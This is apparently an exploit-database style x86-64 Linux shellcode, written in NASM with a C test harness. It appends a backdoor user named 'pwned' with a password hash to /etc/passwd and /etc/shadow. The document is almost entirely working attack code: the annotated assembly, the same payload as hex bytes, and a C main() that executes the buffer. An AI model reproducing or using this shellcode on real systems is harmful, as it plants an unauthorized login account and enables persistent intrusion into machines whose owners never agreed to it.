; shellcode name add_user_password_JCP_open,write,close
; Author    : Christophe G SLAE64-1337
; Len       : 358 bytes
; Language  : Nasm
; "name = pwned ; pass = $pass$"
; add user and password with open,write,close
; tested kali linux , kernel 3.12


global _start

_start:

       xor rax , rax
       push rax
       pop rsi
       push rax                                       ; null all register used for open syscall
       pop rdx
       add al , 0x2
       mov rdi , 0x647773ffffffffff
       shr rdi , 0x28
       push rdi                                       ; "/etc/passwd"
       mov rdi , 0x7361702f6374652f
       push rdi
       mov rdi , rsp
       mov si , 0x441
       mov dx , 0x284
       syscall                                        ; open syscall

       xor edi , edi
       add dil , 0x3

jmp short findaddress                                   ; I placed the jmp short here size of code is too lenght for jmp short if placed in head

_respawn:

       pop r9
       mov  [r9 + 0x30] , byte 0xa                     ; terminate the string
       lea rsi , [r9]   ; "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash'
       mov al , 0x1
       xor rdx , rdx
       add rdx , 0x31
       syscall                                         ; write syscall

       xor edi , edi
       add dil , 0x3
       push rdi
pop rax
       syscall                                         ; close syscall

       xor rax , rax
       push rax
       pop rsi
       add al , 0x2
       mov rdi , 0x776f64ffffffffff                   ; open '/etc/shadow'
       shr rdi , 0x28
       push rdi
       mov rdi , 0x6168732f6374652f
       push rdi
       mov rdi , rsp
       mov si , 0x441
       mov dx , 0x284
       syscall                                       ; open syscall


       xor rax , rax
       add al , 0x1
       xor edi , edi
       add dil , 0x3
       lea rsi , [r9 + 0x31]                      ;  "pwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::", 0xa
       push rax
       pop rdx
       add dl , 0x83
       syscall                                    ; write syscall

       xor edi , edi
       add dil , 0x3
       push rdi
       pop rax
       syscall




       xor rax , rax
       add al , 0x3c                             ;   exit (no matter value of exit code)
       syscall


     findaddress:
        call _respawn
        string : db "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bashApwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::",0xa



#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xc0\x50\x5e\x50\x5a\x04\x02\x48\xbf\xff\xff\xff\xff\xff\x73\x77\x64\x48\xc1\xef\x28\x57\x48\xbf\x2f\x65\x74\x63\x2f\x70\x61\x73\x57\x48\x89\xe7\x66\xbe\x41\x04\x66\xba\x84\x02\x0f\x05\x31\xff\x40\x80\xc7\x03\xeb\x74\x41\x59\x41\xc6\x41\x30\x0a\x49\x8d\x31\xb0\x01\x48\x31\xd2\x48\x83\xc2\x31\x0f\x05\x31\xff\x40\x80\xc7\x03\x57\x58\x0f\x05\x48\x31\xc0\x50\x5e\x04\x02\x48\xbf\xff\xff\xff\xff\xff\x64\x6f\x77\x48\xc1\xef\x28\x57\x48\xbf\x2f\x65\x74\x63\x2f\x73\x68\x61\x57\x48\x89\xe7\x66\xbe\x41\x04\x66\xba\x84\x02\x0f\x05\x48\x31\xc0\x04\x01\x31\xff\x40\x80\xc7\x03\x49\x8d\x71\x31\x50\x5a\x80\xc2\x83\x0f\x05\x31\xff\x40\x80\xc7\x03\x57\x58\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\x87\xff\xff\xff\x70\x77\x6e\x65\x64\x3a\x78\x3a\x31\x30\x30\x31\x3a\x31\x30\x30\x32\x3a\x70\x77\x6e\x65\x64\x2c\x2c\x2c\x3a\x2f\x68\x6f\x6d\x65\x2f\x70\x77\x6e\x65\x64\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x70\x77\x6e\x65\x64\x3a\x24\x36\x24\x75\x69\x48\x37\x78\x2e\x76\x68\x69\x76\x44\x37\x4c\x4c\x58\x59\x24\x37\x73\x4b\x31\x4c\x31\x4b\x57\x2e\x43\x68\x71\x57\x51\x5a\x6f\x77\x33\x65\x73\x76\x70\x62\x57\x56\x58\x79\x52\x36\x4c\x41\x34\x33\x31\x74\x4f\x4c\x68\x4d\x6f\x52\x4b\x6a\x50\x65\x72\x6b\x47\x62\x78\x52\x51\x78\x64\x49\x4a\x4f\x32\x49\x61\x6d\x6f\x79\x6c\x37\x79\x61\x56\x4b\x55\x56\x6c\x51\x38\x44\x4d\x6b\x33\x67\x63\x48\x4c\x4f\x4f\x66\x2f\x3a\x31\x36\x32\x36\x31\x3a\x30\x3a\x39\x39\x39\x39\x39\x3a\x37\x3a\x3a\x3a\x0a";



int main()
{
    printf("Shellcode Length:  %d\n", (int)strlen(code));
    (*(void  (*)()) code)();
}